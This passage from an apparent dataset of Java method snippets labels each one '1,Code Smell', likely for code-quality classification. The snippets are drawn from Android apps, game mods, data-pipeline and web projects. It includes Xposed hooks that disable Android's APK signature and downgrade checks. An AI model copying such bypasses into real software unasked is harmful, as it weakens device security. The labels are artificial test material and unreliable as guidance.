      latinIme.onStartInputInternal(editorInfo,restarting);
    }
  }
}
",1,Code Smell
"private static PhysicsResult cachedPhysics(Vec velocity,Pos entityPosition,Block.Getter getter,PhysicsResult lastPhysicsResult){
  if (lastPhysicsResult != null && lastPhysicsResult.collisionShapes()[1] instanceof ShapeImpl) {
    var currentBlock=getter.getBlock(lastPhysicsResult.collisionPoints()[1].sub(0,Vec.EPSILON,0),Block.Getter.Condition.TYPE);
    var lastBlockBoxes=shape.collisionBoundingBoxes();
    var currentBlockBoxes=((ShapeImpl)currentBlock.registry().collisionShape()).collisionBoundingBoxes();
    if (lastPhysicsResult.collisionY() && velocity.y() == lastPhysicsResult.originalDelta().y() && currentBlockBoxes.equals(lastBlockBoxes) && velocity.x() == 0 && velocity.z() == 0 && entityPosition.samePoint(lastPhysicsResult.newPosition()) && !lastBlockBoxes.isEmpty()) {
      return lastPhysicsResult;
    }
  }
  return null;
}",1,Code Smell
"@Override protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
  String action=((Intent)param.args[0]).getAction();
  if (action.startsWith(BuildConfig.APPLICATION_ID + "".ACTION"")) {
    param.setResult(null);
  }
}
@Override protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
  try {
    if (""android.permission.FORCE_STOP_PACKAGES"".equals(param.args[0])) {
      if (Constants.LAUNCHER_PACKAGE.equals(callMethod(getObjectField(param.thisObject,""mInternal""),""getPackageNameByPid"",Binder.getCallingPid()))) {
        param.setResult(PERMISSION_GRANTED);
      }
    }
  }
 catch (  Throwable ignored) {
  }
}
@Override protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
  if (PM_AllowDowngrade) {
    param.setResult(null);
  }
}
@Override protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
  if (PM_AllowMismatchedSignature && !param.args[1].equals(PERMISSION)) {
    param.setResult(true);
  }
}
@Override protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
  try {
    if (PM_AllowMismatchedSignature && callMethod(callMethod(param.args[0],""getSigningDetails""),""getSignatures"") != null) {
      param.setResult(true);
    }
  }
 catch (  Throwable ignored) {
  }
}
@Override protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
  try {
    if (PM_AllowMismatchedSignature && callMethod(param.args[1],""getPackageName"").equals(param.args[0]) && ((String)callMethod(param.args[1],""getBaseApkPath"")).startsWith(""/data"")) {
      param.setResult(true);
    }
  }
 catch (  Throwable ignored) {
  }
}",1,Code Smell
"@Override protected void report(Request request,Response response,Throwable t){
  if (response.getStatus() < 400 || response.getContentWritten() > 0 || !response.isError()) {
    return;
  }
  try {
    response.getWriter().print(t != null ? t.getCause().getMessage() : response.getMessage());
  }
 catch (  IOException ignored) {
  }
}",1,Code Smell
"public void addArgs(String key,String value){
  for (int i=0; i < argInfos.size(); i++) {
    ArgInfo info=argInfos.get(i);
    if (key != null && key.equals(info.getKey()) || ((info.getKey() == null || info.getKey().isEmpty()) && (info.getValue() == null || info.getValue().isEmpty()))) {
      info.setKey(key);
      info.setValue(value);
      info.setEnabled(true);
      if (i == argInfos.size() - 1) {
        addRow(argInfos.size());
      }
      return;
    }
  }
  argInfos.add(new ArgInfo(key,value));
}",1,Code Smell
"private Mono<Void> handleChildrenDeviceMessage(String deviceId,DeviceMessage children){
  if (deviceId == null || children instanceof DeviceStateCheckMessage || children instanceof DeviceStateCheckMessageReply || children instanceof DisconnectDeviceMessage || children instanceof DisconnectDeviceMessageReply || children.getHeaderOrDefault(Headers.ignoreSession)) {
    return Mono.empty();
  }
  if (children instanceof DeviceMessageReply) {
    DeviceMessageReply reply=((DeviceMessageReply)children);
    if (!reply.isSuccess()) {
      return Mono.empty();
    }
  }
  String childrenId=children.getDeviceId();
  if (children instanceof DeviceOfflineMessage || children instanceof DeviceUnRegisterMessage) {
    return sessionManager.remove(childrenId,removeSessionOnlyLocal(children)).doOnNext(total -> {
      if (total > 0 && children instanceof DeviceOfflineMessage) {
        children.addHeader(Headers.ignore,true);
      }
    }
).then();
  }
 else {
    if (children instanceof DeviceOnlineMessage) {
      children.addHeader(Headers.ignore,true);
    }
    Mono<DeviceSession> sessionHandler=sessionManager.getSession(deviceId).flatMap(parentSession -> this.createOrUpdateSession(childrenId,children,child -> Mono.just(new ChildrenDeviceSession(childrenId,parentSession,child)),Mono::empty).doOnNext(session -> {
      if (session.isWrapFrom(ChildrenDeviceSession.class)) {
        ChildrenDeviceSession childrenSession=session.unwrap(ChildrenDeviceSession.class);
        if (!Objects.equals(deviceId,childrenSession.getParent().getDeviceId())) {
          childrenSession.replaceWith(parentSession);
        }
      }
    }
));
    if (isDoRegister(children)) {
      return this.getDeviceForRegister(children.getDeviceId()).flatMap(device -> device.getSelfConfig(DeviceConfigKey.selfManageState).defaultIfEmpty(false).filter(Boolean.FALSE::equals)).flatMap(ignore -> sessionHandler).then();
    }
    return sessionHandler.then();
  }
}",1,Code Smell
"private void removeBrokenPathEntries(){
  boolean nullEntriesPresent=false;
  for (Iterator<Couple<TrackNode>> iterator=currentPath.iterator(); iterator.hasNext(); ) {
    Couple<TrackNode> couple=iterator.next();
    if (couple == null || couple.getFirst() == null || couple.getSecond() == null) {
      iterator.remove();
      nullEntriesPresent=true;
    }
  }
  if (nullEntriesPresent)   Create.LOGGER.error(""Found null values in path of train with name: "" + train.name.getString() + "", id: ""+ train.id.toString());
}
",1,Code Smell
"@Override protected void annotateClass(Class<?> cl) throws IOException {
  if (this.sendUrl != null) {
    writeObject(this.sendUrl.toString());
  }
 else   if (!(cl.getClassLoader() instanceof URLClassLoader)) {
    writeObject(null);
  }
 else {
    URL[] us=((URLClassLoader)cl.getClassLoader()).getURLs();
    String cb="""";
    for (    URL u : us) {
      cb+=u.toString();
    }
    writeObject(cb);
  }
}
",1,Code Smell
"/** 
 * private method 
 */
private void collectMetrics(Long clusterPhyId,String groupName,Map<String,List<GroupMetrics>> metricsMap,List<VersionControlItem> items){
  long startTime=System.currentTimeMillis();
  Map<TopicPartition,GroupMetrics> subMetricMap=new HashMap<>();
  GroupMetrics groupMetrics=new GroupMetrics(clusterPhyId,groupName,true);
  groupMetrics.putMetric(Constant.COLLECT_METRICS_COST_TIME_METRICS_NAME,Constant.COLLECT_METRICS_ERROR_COST_TIME);
  for (  VersionControlItem v : items) {
    try {
      String metricName=v.getName();
      Result<List<GroupMetrics>> ret=groupMetricService.collectGroupMetricsFromKafka(clusterPhyId,groupName,metricName);
      if (null == ret || ret.failed() || ValidateUtils.isEmptyList(ret.getData())) {
        continue;
      }
      ret.getData().forEach(metrics -> {
        if (metrics.isBGroupMetric()) {
          groupMetrics.putMetric(metrics.getMetrics());
          return;
        }
        TopicPartition tp=new TopicPartition(metrics.getTopic(),metrics.getPartitionId());
        subMetricMap.putIfAbsent(tp,new GroupMetrics(clusterPhyId,metrics.getPartitionId(),metrics.getTopic(),groupName,false));
        subMetricMap.get(tp).putMetric(metrics.getMetrics());
      }
);
    }
 catch (    Exception e) {
      LOGGER.error(""method=collectMetrics||clusterPhyId={}||groupName={}||errMsg=exception!"",clusterPhyId,groupName,e);
    }
  }
  List<GroupMetrics> metricsList=new ArrayList<>();
  metricsList.add(groupMetrics);
  metricsList.addAll(subMetricMap.values());
  groupMetrics.putMetric(Constant.COLLECT_METRICS_COST_TIME_METRICS_NAME,(System.currentTimeMillis() - startTime) / 1000.0f);
  metricsMap.put(groupName,metricsList);
}",1,Code Smell
"private void addAbstractConverters(VolcanoPlanner planner,RelOptCluster cluster,RelSubset subset,boolean subsetToOthers){
  for (  RelSubset other : subsets) {
    assert other.getTraitSet().size() == subset.getTraitSet().size();
    if ((other == subset) || (subsetToOthers && !subset.getConvention().useAbstractConvertersForConversion(subset.getTraitSet(),other.getTraitSet())) || (!subsetToOthers && !other.getConvention().useAbstractConvertersForConversion(other.getTraitSet(),subset.getTraitSet()))) {
      continue;
    }
    final ImmutableList<RelTrait> difference=subset.getTraitSet().difference(other.getTraitSet());
    boolean addAbstractConverter=true;
    int numTraitNeedConvert=0;
    for (    RelTrait curOtherTrait : difference) {
      RelTraitDef traitDef=curOtherTrait.getTraitDef();
      RelTrait curRelTrait=subset.getTraitSet().getTrait(traitDef);
      assert curRelTrait.getTraitDef() == traitDef;
      if (curRelTrait == null) {
        addAbstractConverter=false;
        break;
      }
      boolean canConvert=false;
      boolean needConvert=false;
      if (subsetToOthers) {
        canConvert=traitDef.canConvert(cluster.getPlanner(),curRelTrait,curOtherTrait,subset);
        needConvert=!curRelTrait.satisfies(curOtherTrait);
      }
 else {
        canConvert=traitDef.canConvert(cluster.getPlanner(),curOtherTrait,curRelTrait,other);
        needConvert=!curOtherTrait.satisfies(curRelTrait);
      }
      if (!canConvert) {
        addAbstractConverter=false;
        break;
      }
      if (needConvert) {
        numTraitNeedConvert++;
      }
    }
    if (addAbstractConverter && numTraitNeedConvert > 0) {
      if (subsetToOthers) {
        final AbstractConverter converter=new AbstractConverter(cluster,subset,null,other.getTraitSet());
        planner.register(converter,other);
      }
 else {
        final AbstractConverter converter=new AbstractConverter(cluster,other,null,subset.getTraitSet());
        planner.register(converter,subset);
      }
    }
  }
}",1,Code Smell
"@SuppressWarnings(""deprecation"") public static BuildType getVerifiedBuild(Context ctx,String package_name){
  try {
    Signature[] signatures;
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
      PackageInfo pInfo=Utils.getPackageInfo(ctx.getPackageManager(),package_name,PackageManager.GET_SIGNING_CERTIFICATES);
      signatures=(pInfo.signingInfo == null) ? null : pInfo.signingInfo.getSigningCertificateHistory();
    }
 else {
      @SuppressLint(""PackageManagerGetSignatures"") PackageInfo pInfo=Utils.getPackageInfo(ctx.getPackageManager(),package_name,PackageManager.GET_SIGNATURES);
      signatures=pInfo.signatures;
    }
    if ((signatures == null) || (signatures.length < 1))     return BuildType.UNKNOWN;
    MessageDigest sha1=MessageDigest.getInstance(""SHA"");
    sha1.update(signatures[0].toByteArray());
    String hex=byteArrayToHex(sha1.digest(),sha1.getDigestLength());
switch (hex) {
case ""511140392BFF2CFB4BD825895DD6510CE1807F6D"":
      return BuildType.DEBUG;
case ""EE953D4F988C8AC17575DFFAA1E3BBCE2E29E81D"":
    return isPlaystore() ? BuildType.PLAYSTORE : BuildType.GITHUB;
case ""72777D6939EF150099219BBB68C17220DB28EA8E"":
  return BuildType.FDROID;
}
}
 catch (PackageManager.NameNotFoundException|NoSuchAlgorithmException e) {
Log.e(TAG,""Could not determine the build type"");
}
return BuildType.UNKNOWN;
}
public static BuildType getVerifiedBuild(Context ctx){
  return getVerifiedBuild(ctx,ctx.getPackageName());
}",1,Code Smell
"public void refreshTestPlanStatus(String testPlanId){
  Map<String,Long> caseExecResultCount=new HashMap<>();
  Map<String,TestPlanResourceService> beansOfType=applicationContext.getBeansOfType(TestPlanResourceService.class);
  beansOfType.forEach((k,v) -> {
    Map<String,Long> map=v.caseExecResultCount(testPlanId);
    map.forEach((key,value) -> {
      if (value != 0) {
        caseExecResultCount.merge(key,value,Long::sum);
      }
    }
);
  }
);
  String testPlanFinalStatus=TestPlanConstants.TEST_PLAN_STATUS_UNDERWAY;
  if (MapUtils.isEmpty(caseExecResultCount)) {
    testPlanFinalStatus=TestPlanConstants.TEST_PLAN_STATUS_PREPARED;
  }
 else   if (caseExecResultCount.size() == 1 && caseExecResultCount.containsKey(ExecStatus.PENDING.name()) && caseExecResultCount.get(ExecStatus.PENDING.name()) > 0) {
    testPlanFinalStatus=TestPlanConstants.TEST_PLAN_STATUS_PREPARED;
  }
 else   if (!caseExecResultCount.containsKey(ExecStatus.PENDING.name())) {
    testPlanFinalStatus=TestPlanConstants.TEST_PLAN_STATUS_COMPLETED;
  }
  TestPlan testPlan=new TestPlan();
  testPlan.setId(testPlanId);
  testPlan.setStatus(testPlanFinalStatus);
  testPlanMapper.updateByPrimaryKeySelective(testPlan);
}",1,Code Smell
"@ApiOperation(value=""delete"",notes=""delete engineconn info"",response=Message.class) @ApiImplicitParams({@ApiImplicitParam(name=""ticketid"",required=true,dataType=""String"",value=""ticket id"")}) @RequestMapping(path=""/delete/{ticketid}}"",method=RequestMethod.DELETE) public Message deleteECInfo(HttpServletRequest req,@PathVariable(""ticketid"") String ticketid) throws AMErrorException {
  ECResourceInfoRecord ecResourceInfoRecord=ecResourceInfoService.getECResourceInfoRecord(ticketid);
  String userName=ModuleUserUtils.getOperationUser(req,""deleteECInfo ticketid:"" + ticketid);
  if (null != ecResourceInfoRecord && (userName.equalsIgnoreCase(ecResourceInfoRecord.getCreateUser()) || Configuration.isAdmin(userName))) {
    ecResourceInfoService.deleteECResourceInfoRecord(ecResourceInfoRecord.getId());
    return Message.ok().data(""ecResourceInfoRecord"",ecResourceInfoRecord);
  }
 else {
    return Message.error(""tickedId not exist:"" + ticketid);
  }
}
",1,Code Smell
"private void classCheck(){
  Token lastToken=null;
  if (!lexer.PeekNextToken().Type.toString().equals(""ID"")) {
    error(""Error: in class: "" + className + "", identifier is expected, line: ""+ lexer.PeekNextToken().LineNumber);
  }
 else {
    className=lexer.PeekNextToken().Token;
    Type+=(""|"" + className);
    otherClassType+=className;
    lexer.GetNextToken();
  }
  if (!lexer.PeekNextToken().Token.equals(""{"")) {
    error(""Error: in class: "" + className + "", \""{\"" is expected, line: ""+ lexer.PeekNextToken().LineNumber);
  }
 else {
    lexer.GetNextToken();
  }
  int oldIndex=lexer.getReadIndex();
  Lexer.newLineCheck=false;
  while (lexer.getReadIndex() < textContent.length() - 2) {
    if (!lexer.PeekNextToken().Token.equals("""")) {
      lastToken=lexer.PeekNextToken();
    }
    lexer.GetNextToken();
  }
  lexer.setReadIndex(oldIndex);
  Lexer.newLineCheck=true;
  if (!lastToken.Token.equals(""}"")) {
    error(""Error: in class: "" + className + "", \""}\"" is expected, line: ""+ lastToken.LineNumber);
  }
}",1,Code Smell
"private void showLocationAlert(){
  org.telegram.ui.LocationActivity fragment=new org.telegram.ui.LocationActivity(ChatAttachAlertLocationLayout.LOCATION_TYPE_BIZ);
  if (geo != null) {
    TLRPC.TL_channelLocation initialLocation=new TLRPC.TL_channelLocation();
    initialLocation.address=address;
    initialLocation.geo_point=geo;
    fragment.setInitialLocation(initialLocation);
  }
  fragment.setDelegate((location,live,notify,scheduleDate) -> {
    geo=location.geo;
    if (TextUtils.isEmpty(address) && !TextUtils.isEmpty(fragment.getAddressName()) || mapAddress) {
      mapAddress=true;
      address=fragment.getAddressName();
      if (address == null)       address="""";
      if (editText != null) {
        ignoreEditText=true;
        editText.setText(address);
        editText.setSelection(editText.getText().length());
        ignoreEditText=false;
      }
    }
    updateMapPreview();
    listView.adapter.update(true);
    checkDone(true);
  }
);
  if (geo == null && !TextUtils.isEmpty(address)) {
    AlertDialog progressDialog=new AlertDialog(getContext(),AlertDialog.ALERT_TYPE_SPINNER);
    progressDialog.setCanCancel(false);
    progressDialog.showDelayed(200);
    Utilities.searchQueue.postRunnable(() -> {
      try {
        Geocoder geocoder=new Geocoder(getContext(),LocaleController.getInstance().getCurrentLocale());
        List<Address> addresses=geocoder.getFromLocationName(address,1);
        if (!addresses.isEmpty()) {
          Address geoAddress=addresses.get(0);
          TLRPC.TL_channelLocation initialLocation=new TLRPC.TL_channelLocation();
          initialLocation.address=address;
          initialLocation.geo_point=new TLRPC.TL_geoPoint();
          initialLocation.geo_point.lat=geoAddress.getLatitude();
          initialLocation.geo_point._long=geoAddress.getLongitude();
          fragment.setInitialLocation(initialLocation);
        }
      }
 catch (      Exception e) {
        FileLog.e(e);
      }
      AndroidUtilities.runOnUIThread(() -> {
        progressDialog.dismiss();
        presentFragment(fragment);
      }
);
    }
);
  }
 else {
    presentFragment(fragment);
  }
}",1,Code Smell
"private Label<?> newInstance(Class<? extends Label> labelType,String labelKey,Type labelValueType,Object labelValue) throws LabelErrorException {
  try {
    Label newLabel=labelType.newInstance();
    if (newLabel instanceof InheritableLabel) {
      InheritableLabel inheritableNewLabel=(InheritableLabel)newLabel;
      if (null != labelKey && null == newLabel.getLabelKey()) {
        inheritableNewLabel.setLabelKey(labelKey);
      }
      boolean setString=false;
      if (null != labelValue && labelValue.getClass().equals(String.class)) {
        String SET_STRING_VALUE_METHOD=""setStringValue"";
        try {
          Method method;
          try {
            method=SerializableLabel.class.getDeclaredMethod(SET_STRING_VALUE_METHOD,String.class);
          }
 catch (          NoSuchMethodException e) {
            method=labelType.getDeclaredMethod(SET_STRING_VALUE_METHOD,String.class);
          }
          method.setAccessible(true);
          method.invoke(newLabel,String.valueOf(labelValue));
          setString=true;
        }
 catch (        NoSuchMethodException noe) {
        }
      }
      Class<?> labelValueClass=(Class<?>)labelValueType;
      if (null != labelValue && labelValueClass.isAssignableFrom(labelValue.getClass()) && (!setString || null == newLabel.getValue())) {
        String SET_VALUE_METHOD=""setValue"";
        try {
          Method method=InheritableLabel.class.getDeclaredMethod(SET_VALUE_METHOD,Object.class);
          method.setAccessible(true);
          method.invoke(newLabel,labelValue);
        }
 catch (        NoSuchMethodException noe) {
        }
      }
    }
    return newLabel;
  }
 catch (  InstantiationException|IllegalAccessException|InvocationTargetException e) {
    throw new LabelErrorException(FAILED_CONSTRUCT_INSTANCE.getErrorCode(),MessageFormat.format(FAILED_CONSTRUCT_INSTANCE.getErrorDesc(),labelType.getSimpleName()),e);
  }
}
",1,Code Smell
"@Override public void onMinecartPass(BlockState state,Level world,BlockPos pos,AbstractMinecart cart){
  if (world.isClientSide)   return;
  Vec3 accelerationVec=Vec3.atLowerCornerOf(getAccelerationVector(state));
  double targetSpeed=cart.getMaxSpeedWithRail() * state.getValue(POWER) / 15f;
  if (cart instanceof MinecartFurnace) {
    MinecartFurnace fme=(MinecartFurnace)cart;
    fme.xPush=accelerationVec.x;
    fme.zPush=accelerationVec.z;
  }
  Vec3 motion=cart.getDeltaMovement();
  if ((motion.dot(accelerationVec) >= 0 || motion.lengthSqr() < 0.0001) && targetSpeed > 0)   cart.setDeltaMovement(accelerationVec.scale(targetSpeed));
 else   decelerateCart(pos,cart);
}",1,Code Smell
"public void onDestroyView(){
  if (this.profiles != null) {
    for (    AVEngineKit.ParticipantProfile profile : profiles) {
      if (!profile.isAudience() && !profile.isVideoMuted() && !profile.getUserId().equals(ChatManager.Instance().getUserId())) {
        this.callSession.setParticipantVideoType(profile.getUserId(),profile.isScreenSharing(),AVEngineKit.VideoType.VIDEO_TYPE_NONE);
      }
    }
  }
}
",1,Code Smell
"public void getField(DatasetRowPermissionsTreeObj tree){
  if (ObjectUtils.isNotEmpty(tree)) {
    if (ObjectUtils.isNotEmpty(tree.getItems())) {
      for (      DatasetRowPermissionsTreeItem item : tree.getItems()) {
        if (ObjectUtils.isNotEmpty(item)) {
          if (StringUtils.equalsIgnoreCase(item.getType(),""item"") || ObjectUtils.isEmpty(item.getSubTree())) {
            item.setField(datasetTableFieldManage.selectById(item.getFieldId()));
          }
 else           if (StringUtils.equalsIgnoreCase(item.getType(),""tree"") || (ObjectUtils.isNotEmpty(item.getSubTree()) && StringUtils.isNotEmpty(item.getSubTree().getLogic()))) {
            getField(item.getSubTree());
          }
        }
      }
    }
  }
}
",1,Code Smell
"@Override public void getItemOffsets(Rect outRect,View view,RecyclerView parent,RecyclerView.State state){
  outRect.bottom=space;
  int position=parent.getChildAdapterPosition(view);
  StaggeredGridLayoutManager.LayoutParams params=(StaggeredGridLayoutManager.LayoutParams)view.getLayoutParams();
  if (Shaft.sSettings.getLineCount() == 2) {
    if (position == 0 || position == 1) {
      outRect.top=space;
    }
    if (params.getSpanIndex() % 2 != 0) {
      outRect.left=space / 2;
      outRect.right=space;
    }
 else {
      outRect.left=space;
      outRect.right=space / 2;
    }
  }
 else   if (Shaft.sSettings.getLineCount() == 3) {
    if (position == 0 || position == 1 || position == 2) {
      outRect.top=space;
    }
    if (params.getSpanIndex() % 3 == 0) {
      outRect.left=space;
      outRect.right=space / 2;
    }
 else     if (params.getSpanIndex() % 3 == 1) {
      outRect.left=space / 2;
      outRect.right=space / 2;
    }
 else     if (params.getSpanIndex() % 3 == 2) {
      outRect.left=space / 2;
      outRect.right=space;
    }
  }
 else   if (Shaft.sSettings.getLineCount() == 4) {
    if (position == 0 || position == 1 || position == 2 || position == 3) {
      outRect.top=space;
    }
    if (params.getSpanIndex() % 4 == 0) {
      outRect.left=space;
      outRect.right=space / 2;
    }
 else     if (params.getSpanIndex() % 4 == 1 || params.getSpanIndex() % 4 == 2) {
      outRect.left=space / 2;
      outRect.right=space / 2;
    }
 else     if (params.getSpanIndex() % 4 == 3) {
      outRect.left=space / 2;
      outRect.right=space;
    }
  }
}",1,Code Smell
"private void calculateAverageFrameSize(ExtractorInput input) throws IOException, InterruptedException {
  if (hasCalculatedAverageFrameSize) {
    return;
  }
  averageFrameSize=C.LENGTH_UNSET;
  input.resetPeekPosition();
  if (input.getPosition() == 0) {
    peekId3Header(input);
  }
  int numValidFrames=0;
  long totalValidFramesSize=0;
  while (input.peekFully(scratch.data,0,2,true)) {
    scratch.setPosition(0);
    int syncBytes=scratch.readUnsignedShort();
    if (!AdtsReader.isAdtsSyncWord(syncBytes)) {
      numValidFrames=0;
      break;
    }
 else {
      if (!input.peekFully(scratch.data,0,4,true)) {
        break;
      }
      scratchBits.setPosition(14);
      int currentFrameSize=scratchBits.readBits(13);
      if (currentFrameSize <= 6) {
        hasCalculatedAverageFrameSize=true;
        throw new ParserException(""Malformed ADTS stream"");
      }
      totalValidFramesSize+=currentFrameSize;
      if (++numValidFrames == NUM_FRAMES_FOR_AVERAGE_FRAME_SIZE) {
        break;
      }
      if (!input.advancePeekPosition(currentFrameSize - 6,true)) {
        break;
      }
    }
  }
  input.resetPeekPosition();
  if (numValidFrames > 0) {
    averageFrameSize=(int)(totalValidFramesSize / numValidFrames);
  }
 else {
    averageFrameSize=C.LENGTH_UNSET;
  }
  hasCalculatedAverageFrameSize=true;
}",1,Code Smell
"/** 
 * Gets the current user with the specified request.
 * @param request the specified request
 * @return the current user, returns {@code null} if not logged in
 */
public static JSONObject currentUser(final Request request){
  final Set<Cookie> cookies=request.getCookies();
  if (cookies.isEmpty()) {
    return null;
  }
  try {
    for (    final Cookie cookie : cookies) {
      if (!Sessions.COOKIE_NAME.equals(cookie.getName())) {
        continue;
      }
      final String value=Crypts.decryptByAES(cookie.getValue(),Symphonys.COOKIE_SECRET);
      final JSONObject cookieJSONObject=new JSONObject(value);
      final String userId=cookieJSONObject.optString(Keys.OBJECT_ID);
      if (StringUtils.isBlank(userId)) {
        return null;
      }
      JSONObject ret=SESSION_CACHE.get(userId);
      if (null == ret) {
        ret=tryLogInWithCookie(cookieJSONObject,request);
      }
      if (null == ret) {
        return null;
      }
      final String token=cookieJSONObject.optString(Keys.TOKEN);
      final String password=StringUtils.substringBeforeLast(token,COOKIE_ITEM_SEPARATOR);
      final String userPassword=ret.optString(User.USER_PASSWORD);
      if (!userPassword.equals(password)) {
        return null;
      }
      if (UserExt.USER_STATUS_C_INVALID == ret.optInt(UserExt.USER_STATUS) || UserExt.USER_STATUS_C_INVALID_LOGIN == ret.optInt(UserExt.USER_STATUS) || UserExt.USER_STATUS_C_DEACTIVATED == ret.optInt(UserExt.USER_STATUS)) {
        SESSION_CACHE.remove(userId);
        return null;
      }
      final String ip=Requests.getRemoteAddr(request);
      if (StringUtils.isNotBlank(ip)) {
        ret.put(UserExt.USER_LATEST_LOGIN_IP,ip);
        SESSION_CACHE.put(userId,ret);
      }
      return JSONs.clone(ret);
    }
  }
 catch (  final Exception e) {
    LOGGER.log(Level.WARN,""Parses cookie failed, clears cookie"");
  }
  return null;
}
",1,Code Smell
"protected Color getCheckmarkColor(Component c){
  if (c instanceof JMenuItem && ((JMenuItem)c).isArmed() && !isUnderlineSelection())   return selectionForeground;
  return c.isEnabled() ? checkmarkColor : disabledCheckmarkColor;
}
",1,Code Smell
"static private int replaceMyControllerActivity(PrintWriter pw,InputStream stream,String gdbPort,boolean monkey,boolean simpleMode,String target,boolean alwaysContinue,boolean alwaysKill){
  try {
    InvocationHandler handler=(proxy,method,args1) -> {
      if (method.getName().equals(""setActivityController"")) {
        try {
          args1[0]=replaceActivityController((IActivityController)args1[0]);
        }
 catch (        Throwable e) {
          Log.e(TAG,""replace activity controller"",e);
        }
      }
      return method.invoke(ServiceManager.getService(""activity""),args1);
    }
;
    var amProxy=Proxy.newProxyInstance(BridgeService.class.getClassLoader(),new Class[]{myActivityControllerConstructor.getParameterTypes()[0]},handler);
    Object ctrl;
    if (myActivityControllerConstructor.getParameterCount() == 5) {
      ctrl=myActivityControllerConstructor.newInstance(amProxy,pw,stream,gdbPort,monkey);
    }
 else     if (myActivityControllerConstructor.getParameterCount() == 8) {
      ctrl=myActivityControllerConstructor.newInstance(amProxy,pw,stream,gdbPort,monkey,simpleMode,target,alwaysContinue);
    }
 else {
      ctrl=myActivityControllerConstructor.newInstance(amProxy,pw,stream,gdbPort,monkey,simpleMode,target,alwaysContinue,alwaysKill);
    }
    myActivityControllerRunner.invoke(ctrl);
    return 0;
  }
 catch (  Throwable e) {
    Log.e(TAG,""run monitor"",e);
    return 1;
  }
}",1,Code Smell
"/** 
 * Check if dirty records num exceeds threshold when job finishes.
 * @param processResult  Process result returned by the job.
 * @param messengerGroup Message group indicates reader or writer.
 */
public void check(ProcessResult<?> processResult,MessengerGroup messengerGroup){
  if (processResult == null) {
    return;
  }
  long failed;
  long succeeded;
  List<String> sampleDirtyRecords;
  if (MessengerGroup.READER.equals(messengerGroup)) {
    failed=processResult.getJobFailedInputRecordCount();
    succeeded=processResult.getJobSuccessInputRecordCount();
    sampleDirtyRecords=processResult.getInputDirtyRecords();
  }
 else {
    failed=processResult.getJobFailedOutputRecordCount();
    succeeded=processResult.getJobSuccessOutputRecordCount();
    sampleDirtyRecords=processResult.getOutputDirtyRecords();
  }
  final long total=failed + succeeded;
  log.info(""Group {} found {} success records."",messengerGroup.name(),succeeded);
  if (total == 0) {
    return;
  }
  String formatDirtyStr=formatDirty(sampleDirtyRecords);
  if (failed > 0) {
    log.info(""Group {} found {} dirty records, threshold {}. They are:\n{}"",messengerGroup.name(),failed,failedCountThreshold,formatDirtyStr);
  }
  if (failedCountThreshold >= 0 && failed > failedCountThreshold) {
    throw BitSailException.asBitSailException(CommonErrorCode.TOO_MANY_DIRTY_RECORDS,""Too many dirty records found. Failed "" + failed + "", threshold ""+ failedCountThreshold+ "". They are:\n""+ formatDirtyStr);
  }
  if (failedPercentageThreshold >= 0 && failed > 0 && ((double)failed / total) > failedPercentageThreshold) {
    throw BitSailException.asBitSailException(CommonErrorCode.TOO_MANY_DIRTY_RECORDS,""Too high dirty records percentage found. Failed "" + failed + "", success ""+ succeeded+ "", threshold ""+ failedPercentageThreshold+ "". They are:\n""+ formatDirtyStr);
  }
}",1,Code Smell
"/** 
 * The sanity check.
 * @param conf   The table options
 * @param schema The table schema
 */
private void sanityCheck(Configuration conf,ResolvedSchema schema){
  List<String> fields=schema.getColumnNames();
  if (!schema.getPrimaryKey().isPresent()) {
    String[] recordKeys=conf.get(FlinkOptions.RECORD_KEY_FIELD).split("","");
    if (recordKeys.length == 1 && FlinkOptions.RECORD_KEY_FIELD.defaultValue().equals(recordKeys[0]) && !fields.contains(recordKeys[0])) {
      throw new HoodieValidationException(""Primary key definition is required, use either PRIMARY KEY syntax "" + ""or option '"" + FlinkOptions.RECORD_KEY_FIELD.key() + ""' to specify."");
    }
    Arrays.stream(recordKeys).filter(field -> !fields.contains(field)).findAny().ifPresent(f -> {
      throw new HoodieValidationException(""Field '"" + f + ""' specified in option ""+ ""'""+ FlinkOptions.RECORD_KEY_FIELD.key()+ ""' does not exist in the table schema."");
    }
);
  }
  String preCombineField=conf.get(FlinkOptions.PRECOMBINE_FIELD);
  if (!fields.contains(preCombineField)) {
    if (OptionsResolver.isDefaultHoodieRecordPayloadClazz(conf)) {
      throw new HoodieValidationException(""Option '"" + FlinkOptions.PRECOMBINE_FIELD.key() + ""' is required for payload class: ""+ DefaultHoodieRecordPayload.class.getName());
    }
    if (preCombineField.equals(FlinkOptions.PRECOMBINE_FIELD.defaultValue())) {
      conf.setString(FlinkOptions.PRECOMBINE_FIELD,FlinkOptions.NO_PRE_COMBINE);
    }
 else     if (!preCombineField.equals(FlinkOptions.NO_PRE_COMBINE)) {
      throw new HoodieValidationException(""Field "" + preCombineField + "" does not exist in the table schema.""+ ""Please check '""+ FlinkOptions.PRECOMBINE_FIELD.key()+ ""' option."");
    }
  }
}",1,Code Smell
"private static boolean isOnlyEdge(StatEdge edge){
  Statement stat=edge.getDestination();
  for (  StatEdge ed : stat.getAllPredecessorEdges()) {
    if (ed != edge) {
      if (ed.getType() == StatEdge.TYPE_REGULAR) {
        Statement source=ed.getSource();
        if (source.type == Statement.TYPE_BASICBLOCK || (source.type == Statement.TYPE_IF && ((IfStatement)source).iftype == IfStatement.IFTYPE_IF) || (source.type == Statement.TYPE_DO && ((DoStatement)source).getLooptype() != DoStatement.LOOP_DO)) {
          return false;
        }
      }
 else {
        return false;
      }
    }
  }
  return true;
}
",1,Code Smell
"@Override public boolean onKey(View view,int keyCode,KeyEvent keyEvent){
switch (keyCode) {
case KeyEvent.KEYCODE_DPAD_UP:
case KeyEvent.KEYCODE_DPAD_DOWN:
    if (!mInSeek) {
      setControlsMode(CONTROLS_MODE_FULL);
    }
  return mInSeek;
case KeyEvent.KEYCODE_DPAD_LEFT:
case KeyEvent.KEYCODE_MINUS:
case KeyEvent.KEYCODE_MEDIA_REWIND:
if (keyEvent.getAction() == KeyEvent.ACTION_DOWN) {
  setControlsMode(CONTROLS_MODE_COMPACT);
  onBackward();
}
 else {
  if ((mPlayerData.isSeekConfirmPauseEnabled() || mPlayerData.isSeekConfirmPlayEnabled()) && keyCode == KeyEvent.KEYCODE_DPAD_LEFT) {
